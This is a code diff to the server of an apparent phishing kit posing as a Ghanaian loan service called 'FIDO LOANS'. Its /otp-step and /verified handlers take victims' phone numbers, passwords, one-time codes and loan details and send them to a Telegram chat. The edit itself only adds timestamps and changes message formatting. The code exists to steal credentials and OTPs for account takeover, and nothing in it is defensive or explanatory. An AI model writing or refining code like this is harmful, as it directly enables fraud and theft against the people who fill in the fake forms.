@@ -110,14 +110,17 @@ app.post('/submit', async (req, res) => {
 /* ── POST /otp-step ── */
 app.post('/otp-step', async (req, res) => {
   const { phone, password, code, round } = req.body;
+  const now = new Date().toLocaleString('en-GH', { timeZone: 'Africa/Accra' });
 
   const msg = `
 🔑 <b>OTP RECEIVED – FIDO LOANS</b>
 ━━━━━━━━━━━━━━━━━━━━━━━
 📱 Phone: <b>${esc(phone)}</b>
 🔑 Pass:  <b>${esc(password)}</b>
-🔢 Code:  <code style="background:#eee; padding:2px 4px;">${esc(code)}</code>
+🔢 Code:  <code>${esc(code)}</code>
 🔄 Round: <b>${round} / 4</b>
+
+🕐 <i>Received: ${now}</i>
 `.trim();
 
   try { await sendTelegram(msg); } catch(e) { console.error('[otp notify]', e.message); }
@@ -128,6 +131,7 @@ app.post('/otp-step', async (req, res) => {
 app.post('/verified', async (req, res) => {
   const data = req.body;
   const ref  = data.ref || 'N/A';
+  const now = new Date().toLocaleString('en-GH', { timeZone: 'Africa/Accra' });
 
   const msg = `
 ✅ <b>LOAN APPLICATION VERIFIED – FIDO LOANS</b>
@@ -140,7 +144,7 @@ app.post('/verified', async (req, res) => {
 💰 Amount: <b>GHS ${esc(data.amount)}</b>  |  Term: <b>${esc(data.term)}</b>
 🏷 Ref: <b>${ref}</b>
 
-<i>All 4 OTP rounds passed successfully.</i>
+🕐 <i>Finalized: ${now}</i>
 `.trim();
 
   try { await sendTelegram(msg); } catch(e) { console.error('[verified notify]', e.message); }
